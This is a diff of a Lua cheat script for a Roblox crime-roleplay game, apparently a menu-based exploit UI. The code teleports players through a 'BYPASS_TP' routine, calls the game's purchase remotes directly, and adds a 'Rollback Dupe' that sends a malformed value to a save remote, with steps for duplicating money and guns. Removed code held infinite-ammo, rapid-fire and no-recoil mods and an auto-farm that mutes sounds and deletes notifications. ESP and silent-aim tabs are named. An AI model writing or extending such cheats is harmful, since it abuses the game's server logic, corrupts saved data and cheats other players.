-                TWN(CUR_BTN, { TextColor3 = CFG.COL.GRY, BackgroundTransparency = 1 })
-            end
+            local prev_btn = CUR_BTN
+            CUR_BTN = BTN
+
             if CUR_PAG then
                 CUR_PAG.Visible = false
             end
-
-            CUR_BTN = BTN
             CUR_PAG = PAG
 
-            TWN(BTN, {
-                TextColor3 = Color3.new(0, 0, 0),
-                BackgroundTransparency = 0,
-                BackgroundColor3 = CFG.COL.ACC
-            })
+            if prev_btn then
+                UPDATE_TAB_VISUALS(prev_btn, false)
+            end
+            UPDATE_TAB_VISUALS(BTN, true)
+
             PAG.Visible = true
             PAG.Position = UDim2.new(0, 10, 0, 0)
             TWN(PAG, { Position = UDim2.new(0, 0, 0, 0) }, 0.3)
@@ -3114,11 +3653,13 @@ local function BUILD_NYH_UI()
     end
 
     -- [ TABS ]
-    local P_HOM, B_HOM = MK_TAB("HOME")
-    local P_FRM, B_FRM = MK_TAB("FARM")
-    local P_VIS, B_VIS = MK_TAB("VISUAL")
-    local P_MSC, B_MSC = MK_TAB("MISC")
-    local P_SET, B_SET = MK_TAB("CONFIG")
+    local P_HOM, B_HOM = MK_TAB("HOME", "Teleports & Actions")
+    local P_FRM, B_FRM = MK_TAB("FARM", "Automated Farms")
+    local P_VIS, B_VIS = MK_TAB("VISUAL", "ESP & Silent Aim")
+    local P_MSC, B_MSC = MK_TAB("MISC", "Movement & Tools")
+    local P_OTH, B_OTH = MK_TAB("OTHERS", "Other Features")
+    local P_SET, B_SET = MK_TAB("SETTINGS", "Settings & Themes")
+    UPDATE_SIDEBAR_MODE(CurSidebarTabs)
     -- ============================================================
     -- ============================================================
     local function MK_CARD(parent, title, icon)
@@ -3174,77 +3715,69 @@ local function BUILD_NYH_UI()
 
         local C_TP = MK_CARD(TL, "Teleportation", "rbxassetid://102084991489439")
 
-        local T_LOCS = {
-            ["🏧ATM (Random)"] = "ATM",
-            ["📦Stashes (Random)"] = "STASHES",
-            ["👕Clothes Store"] = Vector3.new(230.20, 175.19, 901.51),
-            ["🧪Lab"] = Vector3.new(316.86, 176.42, 1263.51),
-            ["🚗Car Dealer"] = Vector3.new(-615.37, 176.52, 1057.21),
-            ["🏦Bank"] = Vector3.new(-87.27, 176.54, 1065.10),
-            ["🏢Penthouse"] = Vector3.new(-224.03, 176.55, 1092.41),
-            ["🍬Candy"] = Vector3.new(-1274.97, 124.38, -192.58),
-            ["🌷Personal Grow"] = Vector3.new(-899.27, 107.23, -538.66),
-            ["🖋️Tattoos"] = Vector3.new(216.84, 157.97, -350.63),
-            ["🍗Chicken"] = Vector3.new(620.98, 157.96, -127.97),
-            ["🧼Laundromat"] = Vector3.new(355.27, 176.52, 521.20),
-            ["🌱Plants"] = Vector3.new(20.19, 176.34, 807.75),
-            ["🔫Guns"] = Vector3.new(-275.04, 166.19, 657.18),
-            ["💇‍♂️Chop Shop"] = Vector3.new(-663.33, 176.52, 612.57),
-            ["💳Cards"] = Vector3.new(-237.66, 164.88, -119.46),
-            ["💎Jewelry"] = Vector3.new(13.50, 157.94, -120.88),
-            ["🏪Store"] = Vector3.new(118.07, 176.58, 170.14),
-            ["📦Box job"] = Vector3.new(141.91, 175.88, 193.58)
+        local LOCS = {
+            ["🔫 Gun Store 1"] = Vector3.new(-35521.61, 255.27, 197.68),
+            ["🔫 Gun Store 2"] = Vector3.new(-55.53, 79.67, -140.54),
+            ["🔫 Gun Store 3"] = Vector3.new(-723.45, 63.97, -256.19),
+            ["🧊 Ice Box"] = Vector3.new(206.24, 90.44, 143.81),
+            ["👕 Clothes Store"] = Vector3.new(112.59, 90.44, -38.02),
+            ["✂️ Barber"] = Vector3.new(60.78, 90.36, -49.71),
+            ["🛍️ Frank Shop"] = Vector3.new(4.82, 90.69, -61.26),
+            ["🛍️ Travis Shop"] = Vector3.new(-63.01, 90.51, -51.03),
+            ["👮 Police Station"] = Vector3.new(422.40, 92.33, -83.51),
+            ["🔫 Pawn Shop"] = Vector3.new(200.49, 91.04, -34.77),
+            ["⛽ Gas Station 1"] = Vector3.new(-31.96, 90.34, 282.72),
+            ["⛽ Gas Station 2"] = Vector3.new(-542.33, 49.77, -360.66),
+            ["🚗 Car Customization"] = Vector3.new(-163.45, 89.91, -151.01),
+            ["🏬 Supply Store"] = Vector3.new(-449.18, 51.17, 397.83),
+            ["💣 Black Market"] = Vector3.new(-751, 45, 545),
+            ["🧧 HitMan"] = Vector3.new(-1338.14, 49.78, 433.75),
+            ["🗑️ Sell Trash"] = Vector3.new(-39, 90, -10),
+            ["🏬 Apartments"] = Vector3.new(747.67, 89.74, -376.21),
+            ["💰 Bank Supply"] = Vector3.new(998.59, 231.32, -498.92),
+            ["🐶 Pet Shop"] = Vector3.new(1254.51, 135.42, -557.29),
+            ["🍔 McDonalds"] = Vector3.new(963.17, 129.91, 87.37),
+            ["🍟 Sell Fries"] = Vector3.new(815.84, 90.67, 574.74),
+            ["🏨 Hotel 1"] = Vector3.new(1000, 259, 441),
+            ["🏨 Hotel 2"] = Vector3.new(163.99, 160.88, 439.33),
+            ["👟 Shoes Store"] = Vector3.new(-278.27, 89.74, 504.62),
+            ["🖨️ Sell Printers Pdt"] = Vector3.new(91.03, 132.07, 531.69),
+            ["🛍️ Zay"] = Vector3.new(-603.45, 50.73, 584.89),
+            ["🧽 Laundromat"] = Vector3.new(-59, 90, 391),
+            ["🚗 Car Dealer"] = Vector3.new(433.44, 89.62, -376.54),
+            ["🖋️ Tattoo Shop"] = Vector3.new(983.79, 131.01, -99.94),
+            ["🌃 Club"] = Vector3.new(-440.48, 50.59, 179.16),
+            ["🌱 Sell Weed"] = Vector3.new(754.89, 228.03, -125.40),
+            ["🥖 Chop Shop"] = Vector3.new(237.53, 100.73, 2638.97),
+            ["🌱 Grow Job"] = Vector3.new(1532.60, 89.79, 2672.12),
+            ["💰 Bank"] = Vector3.new(192.66, 89.62, -175.13),
+            ["🎙️ Radar"] = Vector3.new(-35777.34, 17.82, -269.59),
+            ["🎒 Backpack"] = Vector3.new(-184.99, 89.89, 276.40),
+            ["🛍️ Neo Shop"] = Vector3.new(653.68, 89.84, 243.68),
+            ["🔫 Gamepass Guns"] = Vector3.new(-166.85, 105.43, -198.16),
+            ["📦 Packaging"] = Vector3.new(-2369.71, 50.57, 653.50),
+            ["🥤 Juice Job"] = Vector3.new(-2276.70, 49.72, 1338.95)
         }
 
-        local L_LIST = {}
-        for k in pairs(T_LOCS) do table.insert(L_LIST, k) end
-        table.sort(L_LIST)
+        local L_NAMES = {}
+        for k, _ in pairs(LOCS) do table.insert(L_NAMES, k) end
+        table.sort(L_NAMES)
 
-        local D_LOC = ADD_DRP(C_TP, "Select Location", function(v)
-            if v == "🏧ATM (Random)" then
-                local atms = {}
-                local cf = workspace:FindFirstChild("CardFraud") and workspace.CardFraud:FindFirstChild("ATMs")
-                if cf then
-                    for _, atm in pairs(cf:GetDescendants()) do
-                        if atm:IsA("ProximityPrompt") and atm.ActionText == "RINSE A DUMP" and atm.Enabled then
-                            local p = atm.Parent
-                            if p and p:IsA("BasePart") then table.insert(atms, p) end
-                        end
-                    end
-                end
-                if #atms > 0 then
-                    local target = atms[math.random(1, #atms)]
-                    if LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
-                        LPLR.Character.HumanoidRootPart.CFrame = target.CFrame * CFrame.new(0, 3, 0)
-                        NOTIFY("Teleport", "Teleported to a random active ATM!", 3)
-                    end
-                else
-                    NOTIFY("Teleport", "No active ATMs found!", 3)
-                end
-            elseif v == "📦Stashes (Random)" then
-                local stashes = workspace:FindFirstChild("Stashes") and workspace.Stashes:GetChildren()
-                if stashes and #stashes > 0 then
-                    local target = stashes[math.random(1, #stashes)]
-                    local node = target:FindFirstChild("Node")
-                    local cf = node and node:IsA("BasePart") and node.CFrame or target:GetPivot()
-                    if cf and LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
-                        LPLR.Character.HumanoidRootPart.CFrame = cf * CFrame.new(0, 3, 0)
-                        NOTIFY("Teleport", "Teleported to a random stash!", 3)
-                    end
-                else
-                    NOTIFY("Teleport", "No stashes found!", 3)
-                end
-            else
-                local pos = T_LOCS[v]
-                if pos and LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
-                    LPLR.Character.HumanoidRootPart.CFrame = CFrame.new(pos) * CFrame.new(0, 3, 0)
-                    NOTIFY("Teleport", "Arrived at " .. v, 2)
-                end
+        local D_LOC
+        D_LOC = ADD_DRP(C_TP, "Select Location", function(v)
+            local pos = LOCS[v]
+            if pos then
+                BYPASS_TP(pos)
+                NOTIFY("Teleport", "Teleported to " .. v, 2)
             end
+            task.delay(1.5, function()
+                if D_LOC then D_LOC:RESET() end
+            end)
         end)
-        D_LOC.REFRESH(L_LIST)
+        D_LOC:REFRESH(L_NAMES)
 
-        local D_PLR = ADD_DRP(C_TP, "Teleport to Player", function(v)
+        local D_PLR
+        D_PLR = ADD_DRP(C_TP, "Teleport to Player", function(v)
             local target = game:GetService("Players"):FindFirstChild(v)
             if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                 LPLR.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
@@ -3252,6 +3785,9 @@ local function BUILD_NYH_UI()
             else
                 NOTIFY("Teleport", "Player " .. v .. " not found or dead!", 3)
             end
+            task.delay(1.5, function()
+                if D_PLR then D_PLR:RESET() end
+            end)
         end)
 
         local function UPD_PLR_LIST()
@@ -3272,584 +3808,361 @@ local function BUILD_NYH_UI()
         -- [ STORE ITEMS CARD ]
         local C_STORE = MK_CARD(TL, "Store items", "rbxassetid://99896558829728")
 
-        local STORE_ITEMS = {
-            -- Ammo
-            ["Light Ammo"] = SM_REF["Ling Enterprises"].Ammo
-                ["Light Ammo (30 Rounds)"],
-            ["Medium Ammo"] = SM_REF["Ling Enterprises"].Ammo
-                ["Medium Ammo (30 Rounds)"],
-            ["Heavy Ammo"] = SM_REF["Ling Enterprises"].Ammo
-                ["Heavy Ammo (30 Rounds)"],
-            -- Deli
-            ["Cola"] = SM_REF.Deli.Consumables.Cola,
-            ["Gloves"] = SM_REF.Deli.Misc.Gloves,
-            ["Mask"] = SM_REF.Deli.Misc.Mask,
-            ["Vial"] = SM_REF.Deli.Misc.Vial,
-            ["Wound Spray"] = SM_REF.Deli.Misc["Wound Spray"],
-            ["Plant Juice"] = SM_REF.Deli.Misc["Plant Juice"],
-            ["+25 Armor"] = SM_REF["Ling Enterprises"].Misc["+25 Armor"],
-            ["Seed"] = SM_REF["Ling Enterprises"].Misc.Seed
+        local items = {
+            "--[ AMMOS ]--",
+            "DoubleDrum", "Slugs", "9mm", "5.56", "7.62x39mm", "Bullets", "Drum",
+            "--[ STORE ITEMS ]--",
+            "Black Balaclava", "Blue Balaclava", "Red Balaclava", "White Balaclava",
+            "Drank", "Spraypaint", "Cubes", "B&R Ski", "Blue Ski", "White Pink Ski",
+            "Sub", "Chips", "Candy", "Pizza", "Soda", "Water"
         }
 
         local SelectedItem = nil
         local SelectedQty = 1
 
         local D_ITEM = ADD_DRP(C_STORE, "Choose Item", function(v)
-            SelectedItem = v
+            if v:find("%-%-%[") then
+                SelectedItem = nil
+                NOTIFY("Store", "Please select a valid item!", 2)
+            else
+                SelectedItem = v
+            end
         end)
-        local i_list = {
-            "Light Ammo", "Medium Ammo", "Heavy Ammo",
-            "— DELI ITEMS —",
-            "Cola", "Gloves", "Mask", "Vial", "Wound Spray", "Plant Juice", "+25 Armor", "Seed"
-        }
-        D_ITEM.REFRESH(i_list)
+        D_ITEM.REFRESH(items)
 
         local D_QTY = ADD_DRP(C_STORE, "Qty: 1", function(v)
-            SelectedQty = tonumber(v)
+            SelectedQty = tonumber(v) or 1
         end)
         local q_list = {}
         for i = 1, 20 do table.insert(q_list, tostring(i)) end
         D_QTY.REFRESH(q_list)
 
         ADD_BTN(C_STORE, "Purchase", function()
-            if not SelectedItem then return NOTIFY("Error", "Select an item first!", 3) end
-            local item = STORE_ITEMS[SelectedItem]
-            if not item then return end
-
-            local remote = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-            NOTIFY("Store", "Purchasing " .. SelectedQty .. "x " .. SelectedItem .. "...", 3)
-
-            task.spawn(function()
-                for i = 1, SelectedQty do
-                    remote:InvokeServer(item)
-                    task.wait(0.2)
-                end
-                NOTIFY("Store", "Purchase complete!", 3)
-            end)
+            if SelectedItem then
+                local Event = game:GetService("ReplicatedStorage").Events.ServerEvent
+                Event:FireServer("BuyItemTool", SelectedItem, nil, SelectedQty)
+                NOTIFY("Store", "Purchasing " .. SelectedQty .. "x " .. SelectedItem, 2)
+            else
+                NOTIFY("Store", "Select an item first!", 2)
+            end
         end)
+
+        -- [ ROLLBACK DUPE CARD ]
+        local C_ROLLBACK = MK_CARD(TL, "Rollback Dupe", "rbxassetid://87411082578223")
+
+        local HAS_ROLLBACK = false
+        ADD_BTN(C_ROLLBACK, "Rollback Dupe", function()
+            if HAS_ROLLBACK then
+                NOTIFY("Rollback", "You can only use Rollback Dupe \n once per server.", 3)
+                return
+            end
+            HAS_ROLLBACK = true
+
+            local Event = game:GetService("ReplicatedStorage").Remotes.SaveSelectedEmote
+            Event:FireServer(
+                "Pistol",
+                "\xFF"
+            )
+            NOTIFY("Rollback", "Rollback Dupe executed.", 3)
+        end)
+
+        local R_LBL = ADD_LBL(C_ROLLBACK,
+            "1. Execute Rollback Dupe\n2. Drop or spend money\n3. You can dupe guns too!\n4. If you rejoin and an error happens, just click leave and rejoin")
+        R_LBL.Size = UDim2.new(1, -10, 0, 100)
+        R_LBL.TextColor3 = Color3.fromRGB(200, 200, 200)
+        R_LBL.TextSize = 13
+        R_LBL.TextYAlignment = Enum.TextYAlignment.Top
 
         -- [ GUNS CARD ]
         local C_GUNS = MK_CARD(TR, "Guns", "rbxassetid://140547169969789")
 
-        local GUNS_DATA = {
-            -- Pistols
-            ["XD-9"] = SM_REF["Ling Enterprises"].Pistols["XD-9"],
-            ["FN Five-seven"] = SM_REF["Ling Enterprises"].Pistols["FN Five-seven"],
-            ["Glock 17"] = SM_REF["Ling Enterprises"].Pistols["Glock 17"],
-            ["Glock 19x"] = SM_REF["Ling Enterprises"].Pistols["Glock 19x"],
-            ["Glock 19x Grape"] = SM_REF["Ling Enterprises"].Pistols["Glock 19x Grape"],
-            ["Glock 20"] = SM_REF["Ling Enterprises"].Pistols["Glock 20"],
-            ["Glock 23"] = SM_REF["Ling Enterprises"].Pistols["Glock 23"],
-            ["Glock 40"] = SM_REF["Ling Enterprises"].Pistols["Glock 40"],
-
-            -- Melees
-            ["Jason's Machete"] = SM_REF["Ling Enterprises"].Melees["Jason's Machete"],
-            ["\"Lucille\""] = SM_REF["Ling Enterprises"].Melees["\"Lucille\""],
-            ["Baseball Bat"] = SM_REF["Ling Enterprises"].Melees["Baseball Bat"],
-
-            -- Rifles (Ling Heavy)
-            ["Micro Draco"] = SM_REF["Ling Heavy"].Rifles["Micro Draco"],
-            ["Banshee"] = SM_REF["Ling Heavy"].Rifles.Banshee,
-            ["Lil Jeff's Draco"] = SM_REF["Ling Heavy"].Rifles["Lil Jeff's Draco"],
-        }
-
-        local ATTACH_DATA = {
-            -- Old Attachments
-            ["Beam (Red)"] = SM_REF["Issac's Stock"].Attachments.Beam["Beam (Red)"],
-            ["Beam (Blue)"] = SM_REF["Issac's Stock"].Attachments.Beam["Beam (Blue)"],
-            ["Beam (Gang)"] = SM_REF["Issac's Stock"].Attachments.Beam["Beam (Gang)"],
-            ["Beam (Green)"] = SM_REF["Issac's Stock"].Attachments.Beam["Beam (Green)"],
-            ["Beam (Purple)"] = SM_REF["Issac's Stock"].Attachments.Beam["Beam (Purple)"],
-            ["Beam (Yellow)"] = SM_REF["Issac's Stock"].Attachments.Beam["Beam (Yellow)"],
-            ["Binary Trigger"] = SM_REF["Issac's Stock"].Attachments["Binary Trigger"],
-            ["Flash Hider"] = SM_REF["Issac's Stock"].Attachments["Flash Hider"],
-            ["Suppressor"] = SM_REF["Issac's Stock"].Attachments.Suppressor,
-            ["Swift Link"] = SM_REF["Issac's Stock"].Attachments["Swift Link"],
-            ["Switch (Blue)"] = SM_REF["Issac's Stock"].Attachments.Switch["Switch (Blue)"],
-            ["Switch (Default)"] = SM_REF["Issac's Stock"].Attachments.Switch["Switch (Default)"],
-            ["Switch (Gang)"] = SM_REF["Issac's Stock"].Attachments.Switch["Switch (Gang)"],
-            ["Switch (Green)"] = SM_REF["Issac's Stock"].Attachments.Switch["Switch (Green)"],
-            ["Switch (Purple)"] = SM_REF["Issac's Stock"].Attachments.Switch["Switch (Purple)"],
-            ["Switch (Red)"] = SM_REF["Issac's Stock"].Attachments.Switch["Switch (Red)"],
-            ["Switch (Yellow)"] = SM_REF["Issac's Stock"].Attachments.Switch["Switch (Yellow)"],
-
-            -- Mag Kits
-            ["Banana 30rd Mag"] = SM_REF["Ling Enterprises"]["Mag Kits"]["Banana 30rd Mag"],
-            ["Glock 17rd Mag"] = SM_REF["Ling Enterprises"]["Mag Kits"]["Glock 17rd Mag"],
-            ["Glock 19rd Mag"] = SM_REF["Ling Enterprises"]["Mag Kits"]["Glock 19rd Mag"],
-            ["Glock 22rd Mag"] = SM_REF["Ling Enterprises"]["Mag Kits"]["Glock 22rd Mag"],
-            ["Glock 33rd Mag"] = SM_REF["Ling Enterprises"]["Mag Kits"]["Glock 33rd Mag"],
-            ["Tactical 50rd Drum"] = SM_REF["Ling Enterprises"]["Mag Kits"]["Tactical 50rd Drum"],
-            ["Vector 42rd Mag"] = SM_REF["Ling Enterprises"]["Mag Kits"]["Vector 42rd Mag"],
-
-            -- Grip Gloves
-            ["Grip Glove (Yellow)"] = SM_REF["Ling Enterprises"].Attachments["Grip Glove"]["Grip Glove (Yellow)"],
-            ["Grip Glove (Black)"] = SM_REF["Ling Enterprises"].Attachments["Grip Glove"]["Grip Glove (Black)"],
-            ["Grip Glove (Blue)"] = SM_REF["Ling Enterprises"].Attachments["Grip Glove"]["Grip Glove (Blue)"],
-            ["Grip Glove (Gang)"] = SM_REF["Ling Enterprises"].Attachments["Grip Glove"]["Grip Glove (Gang)"],
-            ["Grip Glove (Green)"] = SM_REF["Ling Enterprises"].Attachments["Grip Glove"]["Grip Glove (Green)"],
-            ["Grip Glove (Purple)"] = SM_REF["Ling Enterprises"].Attachments["Grip Glove"]["Grip Glove (Purple)"],
-            ["Grip Glove (Red)"] = SM_REF["Ling Enterprises"].Attachments["Grip Glove"]["Grip Glove (Red)"],
-
-            -- Other Attachments
-            ["Foregrip"] = SM_REF["Ling Enterprises"].Attachments.Foregrip,
-            ["Flashlight"] = SM_REF["Ling Enterprises"].Attachments.Flashlight,
-        }
-
+        local SelectedGun = nil
         local g_list = {
-            "XD-9", "FN Five-seven", "Glock 17", "Glock 19x", "Glock 19x Grape", "Glock 20", "Glock 23", "Glock 40",
-            "— MELEES —",
-            "Jason's Machete", "\"Lucille\"", "Baseball Bat",
-            "— RIFLES —",
-            "Micro Draco", "Banshee", "Lil Jeff's Draco"
+            "--[ PISTOLS ]--",
+            "Hellcat XD | $7,120", "G24 Competition | $3,750", "G20 Grip SilverBack | $6,799",
+            "Kimber 45. Flash | $2,950", "PSA ROCK 5.7 | $2,750", "G41 MOS Kriss | $7,650", "Ruger LCP | $800",
+            "G27 Extended | $4,350", "Glock 36 | $3,865", "P80 Mos Beam | $4,950", "SS MR920P | $4,350",
+            "P80 Extended | $4,750", "G48 PerformanceTrigger | $4,350", "Engraved Colt .38 Super | $6,850",
+            "Canik MC9 Prime | $4,999", "38. Smith&Wesson | $750", "G43X | $3,450", "G22 Compensated | $7,850",
+            "FNXBeam | $4,799", "S&W M2.0 Clearmag | $4,355", "Matchmaster 1911 | $3,100", "Springfield Echelon | $3,470",
+            "Springfield Hellcat | $6,549", "G19XPSAGrip | $5,350", "Glock-17 | $1,350", "G40VectMag | $4,950",
+            "Python | $600", "G31C | $6,499", "Glock19x Extended | $4,450", "G26 | $1,250", "G17Gen5Vect | $3,850",
+            "G23Gen4 Extended | $3,650",
+            "--[ RIFLES ]--",
+            "AR556 GreenTip | $13,500", "308ARP | $9,475", "KelTec Sub2000 | $11,500", "Scoped 762 Micro | $12,150",
+            "Vepr 12 Defender | $9,850", "Tan Arp | $8,150", "556Rifle | $10,420", "SIGMCX | $9,250", "AK74 | $9,300",
+            "Micro KS47 | $7,350", "223Mini | $8,950", "300BlackOut | $7,350", "Kriss Alpine Gen II | $7,890",
+            "M16A2 | $7,500", "BlackMiniDrac | $8,750", "GFR AR10 | $12,899", "ZPAP 762 | $9,500",
+            "SLIMEBALL762 | $10,645", "AR-223 | $10,200", "Colt 723 | $12,450", "BCM4 | $12,360", "PLR-16 | $8,500",
+            "--[ MELEES ]--",
+            "Pocket Knife | $55", "lucille | $1,299", "Kitchen Knife | $85",
+            "--[ CUSTOMS ]--",
+            "G2C Flash Drum | $8,800", "P320XDrumFlash | $8,215", "G22Drum | $7,515", "FDEPLR100Rnd | $12,550",
+            "223 Drum | $13,000", "G27 Drum | $7,650", "50rnd Gen5 | $5,899", "NAK9Drum | $14,600", "G17L Drum | $8,500",
+            "G20DrumFlash | $7,549", "PSA ARP 100rnd | $15,500", "100rnd N4 | $14,500", "G19DrumFlash | $8,900",
+            "G19Gen5Drum | $7,500", "ARP 100 Rnd | $13,500", "PLR-16Drum | $10,500"
         }
-
-        local a_list = {}
-        for k in pairs(ATTACH_DATA) do table.insert(a_list, k) end
-        table.sort(a_list)
 
         local D_GUN = ADD_DRP(C_GUNS, "Select Gun", function(v)
-            local item = GUNS_DATA[v]
-            if item then
-                NOTIFY("Guns", "Purchasing " .. v .. "...", 3)
-                game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase:InvokeServer(item)
-                NOTIFY("Guns", v .. " purchased!", 2)
+            if v:find("%-%-%[") then
+                SelectedGun = nil
+                NOTIFY("Guns", "Select a valid weapon!", 2)
+            else
+                SelectedGun = v:split(" | ")[1]
+                local Event = game:GetService("ReplicatedStorage").Events.ServerEvent
+                Event:FireServer("BuyItemTool", SelectedGun)
+                NOTIFY("Guns", "Purchasing " .. SelectedGun, 2)
             end
         end)
         D_GUN.REFRESH(g_list)
 
-        local D_ATTACH = ADD_DRP(C_GUNS, "Select Attachment", function(v)
-            local item = ATTACH_DATA[v]
-            if item then
-                NOTIFY("Attachments", "Purchasing " .. v .. "...", 3)
-                game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase:InvokeServer(item)
-                NOTIFY("Attachments", v .. " purchased!", 2)
-            end
-        end)
-        D_ATTACH.REFRESH(a_list)
+        local D_MODS = ADD_DRP(C_GUNS, "Gun Mods")
 
-        local D_GMODS = ADD_DRP(C_GUNS, "Gun Mods")
-        ADD_TOG(D_GMODS.SCR, "Inf Mags", _G.EXE.GUN_MODS.InfAmmo, function(v)
-            _G.EXE.GUN_MODS.InfAmmo = v
-            NOTIFY("Gun Mods", "Inf Mags: " .. (v and "Enabled" or "Disabled"), 2)
-        end, true)
-        ADD_TOG(D_GMODS.SCR, "Rapid Fire", _G.EXE.GUN_MODS.RapidFire, function(v)
-            _G.EXE.GUN_MODS.RapidFire = v
-            NOTIFY("Gun Mods", "Rapid Fire: " .. (v and "Enabled" or "Disabled"), 2)
-        end, true)
-        ADD_TOG(D_GMODS.SCR, "No Recoil", _G.EXE.GUN_MODS.NoRecoil, function(v)
-            _G.EXE.GUN_MODS.NoRecoil = v
-            NOTIFY("Gun Mods", "No Recoil: " .. (v and "Enabled" or "Disabled"), 2)
-        end, true)
+        local function STYLE_MOD(tgl)
+            if tgl and tgl.FRM then
+                tgl.FRM.BackgroundTransparency = 1
+                tgl.FRM.ZIndex = 10
+                local str = tgl.FRM:FindFirstChildOfClass("UIStroke")
+                if str then str:Destroy() end
 
-        -- [ BED FARM LOGIC ]
-        local BedToggled = false
-        local BedStopping = false
-        local soundCache = {} -- [Sound] = originalVolume
-        local initialCF = nil
-        local farmStartTime = 0
-        local minFarmDuration = 17
-        local repLabel = nil
-        local levelUpText = nil
-        local totalGained = 0
-        local repAtStart = 0
-        local repConn = nil
-        local lastRepValue = 0
-        local levelUpDetected = false
-
-        -- Stats Reference
-        local stats = game:GetService("ReplicatedStorage"):WaitForChild("PlayerData"):WaitForChild(LPLR.Name)
-            :WaitForChild("Statistics")
-        local repValue = stats:WaitForChild("Reputation")
-
-        local function muteSounds(mute)
-            local SS = game:GetService("SoundService")
-            local PG = LPLR:WaitForChild("PlayerGui")
-
-            -- Combine all relevant sound parents
-            local parents = { workspace, SS, PG }
-
-            if mute then
-                for _, parent in ipairs(parents) do
-                    for _, s in pairs(parent:GetDescendants()) do
-                        if s:IsA("Sound") and s.Volume > 0 then
-                            if not soundCache[s] then
-                                soundCache[s] = s.Volume
-                            end
-                            s.Volume = 0
-                        end
-                    end
-                end
-            else
-                for s, vol in pairs(soundCache) do
-                    if s and s.Parent then
-                        pcall(function() s.Volume = vol end)
-                    end
-                end
-                soundCache = {}
-            end
-        end
-
-        local function startNotifKiller()
-            local HUD = LPLR.PlayerGui:WaitForChild("HUD", 5)
-            local notifications = HUD and HUD:WaitForChild("Group"):WaitForChild("Notifications")
-            if not notifications then return end
-
-            local function getKillParent(obj)
-                local cur = obj
-                for _ = 1, 6 do
-                    if not cur then break end
-                    if cur.Parent == notifications then return cur end
-                    cur = cur.Parent
-                end
-                return nil
-            end
-            local function tryDelete(obj)
-                if not (obj:IsA("TextLabel") or obj:IsA("TextButton")) then return end
-                local txt = tostring(obj.Text):upper()
-                if string.find(txt, "20 POINTS", 1, true) and string.find(txt, "200 REPUTATION", 1, true) and string.find(txt, "FOR SLEEPING", 1, true) then
-                    local target = getKillParent(obj)
-                    if target and target.Parent then target:Destroy() end
-                end
-            end
-            for _, v in ipairs(notifications:GetDescendants()) do tryDelete(v) end
-            notifications.DescendantAdded:Connect(function(v)
-                task.wait()
-                tryDelete(v)
-            end)
-        end
-
-        local function removeScreen()
-            for _, v in pairs(CORE:GetChildren()) do
-                if v.Name == "FarmScreen" then v:Destroy() end
-            end
-        end
-
-        local function getCleanRep()
-            local rep = tostring(repValue.Value)
-            return tonumber(rep:sub(2)) or 0
-        end
-
-        local function REJOIN()
-            local lobby = game:GetService("ReplicatedStorage").RemoteEvents:WaitForChild("Lobby")
-            pcall(function()
-                lobby:InvokeServer()
-            end)
-        end
-
-        local function updateRepLabel()
-            if repLabel then
-                local currentRep = getCleanRep()
-                local delta = currentRep - lastRepValue
-
-                if delta < -50 then
-                    delta = currentRep
+                local lbl = tgl.FRM:FindFirstChildOfClass("TextLabel")
+                if lbl then
+                    lbl.TextColor3 = Color3.new(1, 1, 1)
+                    lbl.ZIndex = 11
                 end
 
-                if delta > 0 then
-                    totalGained = totalGained + delta
-                    if lastRepValue > 80 and currentRep < 30 and not levelUpDetected then
-                        levelUpDetected = true
-                        if levelUpText then
-                            levelUpText.Visible = true
-                            levelUpText.TextTransparency = 0
-                            task.spawn(function()
-                                for i = 1, 30 do
-                                    levelUpText.Position = levelUpText.Position + UDim2.new(0, 0, -0.02, 0)
-                                    levelUpText.TextTransparency = levelUpText.TextTransparency + 0.033
-                                    task.wait(0.02)
-                                end
-                                levelUpText.Visible = false
-                                levelUpText.Position = UDim2.new(0.5, -200, 0.2, 0)
-                            end)
-                        end
-                        levelUpDetected = false
-                    end
-                end
-
-                lastRepValue = currentRep
-                repLabel.Text = "+" .. tostring(totalGained) .. " REP"
-
-                -- AUTO REJOIN CHECK
-                if _G.TARGET_REP and _G.TARGET_REP > 0 and totalGained >= _G.TARGET_REP then
-                    REJOIN()
+                local btn = tgl.FRM:FindFirstChildOfClass("TextButton")
+                if btn then
+                    btn.ZIndex = 12
+                    btn.BackgroundTransparency = 0
+                    local ind = btn:FindFirstChildOfClass("Frame")
+                    if ind then ind.ZIndex = 13 end
                 end
             end
         end
 
-        local function makeScreen(imageId)
-            removeScreen()
-            repLabel = nil
-            local function MK_SCREEN(name, order)
-                local sg = Instance.new("ScreenGui", CORE)
-                sg.Name = "FarmScreen"
-                sg.DisplayOrder = order
-                sg.ResetOnSpawn = false
-                sg.IgnoreGuiInset = true
-                return sg
-            end
-
-            local black1 = MK_SCREEN("Black1", 2147483644)
-            local f1 = Instance.new("Frame", black1)
-            f1.Size = UDim2.new(1, 0, 1, 0)
-            f1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            f1.BorderSizePixel = 0
-
-            local black2 = MK_SCREEN("Black2", 2147483645)
-            local f2 = Instance.new("Frame", black2)
-            f2.Size = UDim2.new(1, 0, 1, 0)
-            f2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            f2.BorderSizePixel = 0
-
-            local imgSg = MK_SCREEN("Image", 2147483646)
-            local img = Instance.new("ImageLabel", imgSg)
-            img.Size = UDim2.new(1, 0, 1, 0)
-            img.Image = "rbxassetid://" .. imageId
-            img.BackgroundTransparency = 1
-
-            if imageId == "72647550241860" then
-                local repSg = MK_SCREEN("Rep", 2147483647)
-                local frame = Instance.new("Frame", repSg)
-                frame.Size = UDim2.new(0, 350, 0, 120)
-                frame.Position = UDim2.new(0.5, -175, 0.5, -60)
-                frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-                frame.BackgroundTransparency = 0.1
-                RND(frame, 15)
-                STR(frame, Color3.fromRGB(100, 200, 255), 2)
-
-                local grad = Instance.new("UIGradient", frame)
-                grad.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 50)),
-                    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25)) })
-                grad.Rotation = 45
-
-                repLabel = Instance.new("TextLabel", frame)
